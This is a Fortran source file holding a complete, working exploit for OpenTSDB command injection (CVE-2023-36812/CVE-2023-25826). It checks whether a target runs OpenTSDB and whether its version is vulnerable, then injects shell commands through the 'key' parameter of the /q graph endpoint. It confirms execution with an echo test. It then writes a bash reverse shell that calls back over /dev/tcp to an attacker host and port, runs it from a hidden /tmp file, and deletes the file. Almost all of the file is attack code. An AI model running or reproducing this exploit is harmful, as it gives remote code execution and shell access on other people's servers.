module exploit
  use http, only : response_type, request
  implicit none

  ! module-level variables
  logical :: verbose = .false.

  ! private functions only used in this module
  private :: get_random_string
  private :: get_time
  private :: yeet_payload

  ! public functions accessible from outside this module
  public :: print_banner
  public :: check_target
  public :: check_version
  public :: select_metric
  public :: select_aggregator
  public :: check_vulnerability_status
  public :: ye_olde_shell_popper
contains
  subroutine print_banner()
    character(100) :: line
    ! Define ANSI escape codes for colors
    character(4) :: reset_color = CHAR(27) // "[0m"
    character(5) :: red = CHAR(27) // "[31m"
    character(5) :: green = CHAR(27) // "[32m"
    character(5) :: yellow = CHAR(27) // "[33m"
    character(5) :: blue = CHAR(27) // "[34m"

    print '(A,A)',                 '---------------------------------------',                  '---------------------'
    print '(A,A,A,A)', green,      '   ___               _____ ___ ___  ___', red,             '        ___  ___ ___ '
    print '(A,A,A,A,A,A)', green,  '  / _ \ _ __  ___ _ |_   _/ __|   \| _ )', yellow, ' _/\_', red, ' | _ \/ __| __|'
    print '(A,A,A,A,A,A)', green,  " | (_) | '_ \/ -_) ' \| | \__ \ |) | _ \", yellow, " >  <", red, " |   / (__| _| "
    print '(A,A,A,A,A,A)', green,  '  \___/| .__/\___|_||_|_| |___/___/|___/', yellow, '  \/', red, '  |_|_\\___|___|'
    print '(A,A,A)', green,        '       |_|'
    print '(A,A)', blue,           '( a CVE-2023-36812/CVE-2023-25826 exploit written in Fortran )'
    print '(A)', reset_color
    print '(A,A,A,A)', red,        '                  Erik Wynter ', green, '(@wyntererik)'
    print '(A,A,A)', reset_color,  '---------------------------------------',                  '---------------------'
    print '(A)', reset_color
  end subroutine

  subroutine print_status(status, target_url, string_to_print)
    character(*) :: target_url, string_to_print
    character(1) :: status
    character(256) :: total_string
    total_string = '[' // status // '] ' // trim(target_url) // '  -  ' // trim(string_to_print)

    print '(A)', trim(total_string)
  end subroutine print_status

  ! this is a wrapper for the print_status subroutine that only prints if verbose is set to true
  subroutine vprint_status(status, target_url, string_to_print)
    character(*) :: target_url, string_to_print
    character(1) :: status
    if (verbose) then
      call print_status(status, target_url, string_to_print)
    end if
  end subroutine vprint_status

  function check_target(target_url) result(return_code)
    character(*) :: target_url
    character(200) :: return_msg
    integer :: return_code
    type(response_type) :: response

    ! Send a GET request to check if the target is up
    call vprint_status('*', target_url, 'Checking the target')
    response = request(trim(target_url))

    ! Check if the request was successful
    if (.not. response%ok) then
      call print_status('-', target_url, 'Error message: ' // response%err_msg)
      return_code = 1
      return
    end if

    ! check the response code, which should be 200
    if (response%status_code .ne. 200) then
      ! add the integer response code to the string to print
      write(return_msg, '(A, I0)') 'Received unexpected response code: ', response%status_code
      call print_status('-', target_url, return_msg)
      return_code = 1
      return
    end if

    ! check if the HTML title is OpenTSDB
    if (index(response%content, '<title>OpenTSDB</title>') == 0) then
      call print_status('-', target_url, 'The target is not OpenTSDB')
      return_code = 1
      return
    end if

    call print_status('*', target_url, 'The target seems to be OpenTSDB')

    return_code = 0
    return
  end function check_target
  
  function check_version(target_url) result(return_code)
    character(*) :: target_url
    character(2) :: major_version
    character(3) :: minor_version
    character(10) :: patch_version
    character(15) :: version
    character(256) :: return_msg
    integer :: return_code, version_dot_ct, index_a, index_z, ix, major_version_int, minor_version_int, stat_major, stat_minor
    type(response_type) :: response

    ! get the version via the api
    call vprint_status('*', target_url, 'Checking the version via /api/version')
    response = request(trim(target_url) // '/api/version')

    ! check if the request was successful
    if (.not. response%ok) then
      call print_status('-', target_url, 'Error message: ' // response%err_msg)
      return_code = 1
      return
    end if

    ! check the response code, which should be 200
    if (response%status_code .ne. 200) then
      ! add the integer response code to the string to print
      write(return_msg, '(A, I0)') 'Received unexpected response code: ', response%status_code
      call print_status('-', target_url, return_msg)
      return_code = 1
      return
    end if

    ! check if the response contains `"version":"`
    index_a = index(response%content, '"version":"')
    if (index_a <= 0) then
      call print_status('-', target_url, 'The OpenTSDB version could not be determined')
      return_code = 1
      return
    end if

    ! extract the version string
    index_z = index_a + 11
    version = ""
    do while (response%content(index_z:index_z) /= '"')
      ! make sure the version number is not longer than 15 characters
      ! the longest actual version seems to be 9 characters currently, so 15 should be plenty to support future versions
      if (len_trim(version) >= 15) then
        call print_status('-', target_url, 'The OpenTSDB version format is not supported.')
        call print_status('!', target_url, 'The version string is longer than 15 characters: ' // version)
        return_code = 1
        return
      end if

      version = trim(version) // response%content(index_z:index_z)
      index_z = index_z + 1
    end do

    version = trim(version)
   
    ! check if we got a version
    if (len(version) == 0) then
      call print_status('-', target_url, 'The OpenTSDB version could not be determined')
      return_code = 1
      return
    end if
  
    major_version = ""
    minor_version = ""
    patch_version = ""
    version_dot_ct = 0

    ! iterate over all chars in the version string
    do ix = 1, len(version)
      ! check if the current char is a dot
      if (version(ix:ix) == '.') then
        version_dot_ct = version_dot_ct + 1
      else
        ! check if this is the first dot
        select case (version_dot_ct)
        case (0)
          major_version = trim(major_version) // version(ix:ix)
        case (1)
          minor_version = trim(minor_version) // version(ix:ix)
        case (2)
          patch_version = trim(patch_version) // version(ix:ix)
        end select
      end if
    end do

    ! check if the version matches the expected format, which should start with \d\.\d+\.\d+
    ! some versions end with a suffix, e.g. 2.2.0 RC1, but we can ignore that since we only care about the major and minor version
    ! first check if there are exactly 2 dots in the version string
    if (version_dot_ct /= 2) then
      call print_status('-', target_url, 'The version format is not recognized: ' // version)

      return_code = 1
      return
    end if

    ! trim the versions
    major_version = trim(major_version)
    minor_version = trim(minor_version)
    patch_version = trim(patch_version)

    ! check if the major version and minor versions are numbers by converting them to integers
    read(major_version,*,iostat=stat_major) major_version_int
    read(minor_version,*,iostat=stat_minor) minor_version_int
    
    ! check if the conversions were successful
    if (stat_major /= 0 .or. stat_minor /= 0) then
      call print_status('-', target_url, 'The version format is not recognized: ' // version)
      return_code = 1
      return
    end if

    ! the major version should be 1 digit, the minor version should be 1 or 2 digits
    if (major_version_int < 0 .or. major_version_int > 9 .or. minor_version_int < 0 .or. minor_version_int > 99) then
      call print_status('-', target_url, 'The version format is not recognized: ' // version)
      return_code = 1
      return
    end if

    ! versions up to and including 2.4.1 are vulnerable.
    ! first check if the version is 2.3.* or lower
    if (major_version_int < 2 .or. (major_version_int == 2 .and. minor_version_int < 4)) then
      call print_status('+', target_url, 'The target seems unpatched. Detected openTSDB version: ' // version)
      return_code = 0
      return
    end if

    ! check if the version if 2.5 or higher
    if (major_version_int > 2 .or. (major_version_int == 2 .and. minor_version_int > 4)) then
      call print_status('-', target_url, 'The target seems patched. Detected openTSDB version: ' // version)
      return_code = 1
      return
    end if

    ! if we get here, the version is 2.4.*
    ! the only vulnerable versions are 2.4.0 and 2.4.1, so for any other version, let's assume the target is patched
    if (patch_version == '0' .or. patch_version == '1') then
      call print_status('+', target_url, 'The target seems unpatched. Detected openTSDB version: ' // version)
      return_code = 0
      return
    end if

    call print_status('-', target_url, 'The target seems patched. Detected openTSDB version: ' // version)
    return_code = 1
    return
  end function check_version

  function select_metric(target_url) result(metric)
    character(*) :: target_url
    character(21) :: metrics_endpoint
    character(100) :: metric ! metrics should not be that long
    character(256) :: return_msg
    integer :: index_a
    type(response_type) :: response

    metric = ""
    metrics_endpoint = '/suggest?type=metrics'
    call vprint_status('*', target_url, 'Checking for available metrics via ' // metrics_endpoint)

    print '(A)', trim(target_url) // metrics_endpoint
    response = request(trim(target_url) // metrics_endpoint)

    ! check if the request was successful
    if (.not. response%ok) then
      call print_status('-', target_url, 'Error message: ' // response%err_msg)
      return
    end if

    ! check the response code, which should be 200
    if (response%status_code .ne. 200) then
      ! add the integer response code to the string to print
      write(return_msg, '(A, I0)') 'Received unexpected response code ', response%status_code
      call print_status('-', target_url, return_msg)
      return
    end if

    ! The response should be a JSON array if any metrics are configured, so let's check if it starts with '["'
    if (index(response%content, '["') /= 1) then
      call print_status('-', target_url, 'The response does not seem to be a JSON array')
      return
    end if

    index_a = 3
    ! Get the first item from the JSON array
    do while (response%content(index_a:index_a) /= '"')
      ! make sure the metric is not longer than 100 characters
      ! most metrics are fairly short, this should be big enough
      if (len_trim(metric) >= 100) then
        call print_status('-', target_url, 'The identified metrics are not in a supported format.')
        call print_status('!', target_url, 'The first metric is 100+ characters long. Printing the full response: ')
        print '(A)', response%content

        return
      end if

      metric = trim(metric) // response%content(index_a:index_a)
      index_a = index_a + 1
    end do

    metric = trim(metric)

    ! check if we got a metric
    if (len(metric) == 0) then
      call print_status('-', target_url, 'No metrics were found')

      return
    end if

    call print_status('*', target_url, 'Using metric: ' // metric)
  end function select_metric

  function select_aggregator(target_url) result(aggregator)
    character(*) :: target_url
    character(12) :: aggregators_endpoint
    character(100) :: aggregator ! aggregators should not be that long
    character(256) :: return_msg
    integer :: index_a
    type(response_type) :: response

    aggregator = ""
    aggregators_endpoint = '/aggregators'
    call vprint_status('*', target_url, 'Checking for available aggregators via ' // aggregators_endpoint)

    response = request(trim(target_url) // aggregators_endpoint)

    ! check if the request was successful
    if (.not. response%ok) then
      call print_status('-', target_url, 'Error message: ' // response%err_msg)
      return
    end if

    ! check the response code, which should be 200
    if (response%status_code .ne. 200) then
      ! add the integer response code to the string to print
      write(return_msg, '(A, I0)') 'Received unexpected response code ', response%status_code
      call print_status('-', target_url, return_msg)
      return
    end if

    ! The response should be a JSON array if any aggregators are configured, so let's check if it starts with '["'
    if (index(response%content, '["') /= 1) then
      call print_status('-', target_url, 'The response does not seem to be a JSON array')
      return
    end if

    index_a = 3
    ! Get the first item from the JSON array
    do while (response%content(index_a:index_a) /= '"')
      ! make sure the aggregator is not longer than 100 characters
      ! most aggregators are fairly short, this should be big enough
      if (len_trim(aggregator) >= 100) then
        call print_status('-', target_url, 'The identified aggregators are not in a supported format.')
        call print_status('!', target_url, 'The first aggregator is 100+ characters long. Printing the full response: ')
        print '(A)', response%content

        return
      end if

      aggregator = trim(aggregator) // response%content(index_a:index_a)
      index_a = index_a + 1
    end do

    aggregator = trim(aggregator)

    ! check if we got a aggregator
    if (len(aggregator) == 0) then
      call print_status('-', target_url, 'No aggregators were found')

      return
    end if

    call print_status('*', target_url, 'Using aggregator: ' // aggregator)
  end function select_aggregator

  function get_time(type) result(formatted_timestamp)
    character(3) :: type
    character(8) :: formatted_time
    character(10) :: formatted_date
    character(19) :: formatted_timestamp
    integer :: date_time(8), year, month, day, hour, minute, second, rand_year_deduct
    real :: random_real

    ! Get the current date and time components
    call date_and_time(values=date_time)
    year = date_time(1)
    month = date_time(2)
    day = date_time(3)
    hour = date_time(5)
    minute = date_time(6)
    second = date_time(7)

    ! if we want the start time, we need to set some random numbers
    if (type == 'beg') then
      ! Initialize the random number generator
      call random_seed()
      ! here we need to deduct a random amount of time from the current time
      ! first deduct between 1-5 years
      call random_number(random_real)
      rand_year_deduct = 1 + floor(random_real * 5)
      year = year - rand_year_deduct

      ! set a random month
      call random_number(random_real)
      month = 1 + floor(random_real * 12)

      ! set a random day
      call random_number(random_real)
      day = 1 + floor(random_real * 28)

      ! set a random hour
      call random_number(random_real)
      hour = floor(random_real * 24)

      ! set a random minute
      call random_number(random_real)
      minute = floor(random_real * 60)

      ! set a random second
      call random_number(random_real)
      second = floor(random_real * 60)
    end if

    ! format the date according to 2023/09/01-00:00:00
    write(formatted_date, '(I0.4, A, I0.2, A, I0.2)') year, '/', month, '/', day
    write(formatted_time, '(I0.2, A, I0.2, A, I0.2)') hour, ':', minute, ':', second

    formatted_timestamp = formatted_date // '-' // formatted_time
  end function get_time

  function get_random_string(string_length) result(random_string)
    integer :: string_length, ix, an_ix
    character(string_length) :: random_string
    character(36) :: alphanumeric = 'abcdefghijklmnopqrstuvwxyz0123456789'
    real(8) :: random_value

    ! Initialize the random number generator
    call random_seed()
    ! Generate a random alphanumeric string
    do ix = 1, string_length
        call random_number(random_value)
        an_ix = floor(random_value * 36) + 1  ! 26 letters + 10 numbers
        random_string(ix:ix) = alphanumeric(an_ix:an_ix)
    end do
  end function get_random_string

  function check_vulnerability_status(target_url, metric, aggregator) result(return_code)
    character(*) :: target_url
    character(24) :: random_echo_string
    character(100) :: metric, aggregator, cmd
    character(500) :: response_body
    integer :: return_code
    type(response_type) :: response

    ! The cmd is `echo <random_string> 1>&2` => redirect stdout to stderr since that is what we get back in the response
    random_echo_string = get_random_string(24)
    cmd = 'echo+' // random_echo_string // '+1%3E%262'
    call vprint_status('*', target_url, 'Checking if the target is vulnerable by having it echo a random string')

    response_body = yeet_payload(target_url, metric, aggregator, cmd)

    ! check if response_body is empty, which means the request failed
    if (len_trim(response_body) == 0) then
      return_code = 1
      return
    end if

    ! check if the response contains the random string
    if (index(response_body, random_echo_string) == 0) then
      call print_status('-', target_url, 'The target does not seem vulnerable')
      return_code = 1
      return
    end if

    call print_status('+', target_url, 'The target is vulnerable. The target executed the echo command')
    return_code = 0
   
  end function check_vulnerability_status

  function ye_olde_shell_popper(target_url, metric, aggregator, lhost, lport) result(return_code)
    character(*) :: target_url, metric, aggregator, lhost, lport
    character(11) :: temp_file
    character(500) :: cmd, response_body
    integer :: return_code
    type(response_type) :: response

    ! the command will be executed in a very restricted shell, which makes it hard to directly execute a reverse shell
    ! instead, we will write the payload to a temp file and execute that
    ! generate the file name for the temp file
    temp_file = get_random_string(5)
    temp_file = '/tmp/.' // temp_file

    ! write a simple bash reverse shell to the temp file and execute it
    ! echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' > <temp_file>; bash <temp_file> &
    cmd = 'echo+%27bash+-i+%3E%26+/dev/tcp/' // trim(lhost) // '/' // trim(lport) // '+0%3E%261%27%3E+'
    cmd = trim(cmd) // trim(temp_file) // '%3B+bash+' // trim(temp_file) // '%26'

    call print_status('*', target_url, 'Writing the payload to ' // temp_file)
    response_body = yeet_payload(target_url, metric, aggregator, cmd)

    if (len_trim(response_body) == 0) then
      return_code = 1
      return
    end if

    call print_status('+', target_url, 'Payload executed. Check your listener for a shell')

    ! clean up the temp file
    call vprint_status('*', target_url, 'Cleaning up the temp file' // temp_file)
    call sleep(1)
    cmd = 'rm+' // temp_file
    response_body = yeet_payload(target_url, metric, aggregator, trim(cmd))

    if (len_trim(response_body) == 0) then
      call print_status('-', target_url, 'Cleanup faild. Manual cleanup required for ' // temp_file)
      return_code = 1
      return
    end if

    call print_status('*', target_url, 'Cleanup attempted for ' // temp_file)

    return_code = 0
  end function ye_olde_shell_popper

  function yeet_payload(target_url, metric, aggregator, cmd) result(response_body)
    character(*) :: target_url, cmd, metric, aggregator
    ! we only need the response body when checking the vuln status and 500 is long enough for that scenario
    character(500) :: payload, response_body
    type(response_type) :: response

    ! build the payload
    payload = '/q?start=' // get_time('beg') // '&end=' // get_time('end')
    payload = trim(payload) // '&m=' // trim(aggregator) // ':' // trim(metric)
    payload = trim(payload) // '&o=axis+x1y2&ylabel=' // get_random_string(10) // '&y2label=' // get_random_string(10)
    payload = trim(payload) // '&yrange=[0:]&y2range=[0:]&key=%3Bsystem+%22'
    payload = trim(payload) // trim(cmd)
    payload = trim(payload) // '%22+%22&wxh=1408x467&style=linespoint&json'

    response = request(trim(target_url) // trim(payload))
    ! check if the request was successful
    if (.not. response%ok) then
      call print_status('-', target_url, 'Error message: ' // response%err_msg)
      response_body = ""
      return
    end if

    response_body = response%content
  end function
end module exploit
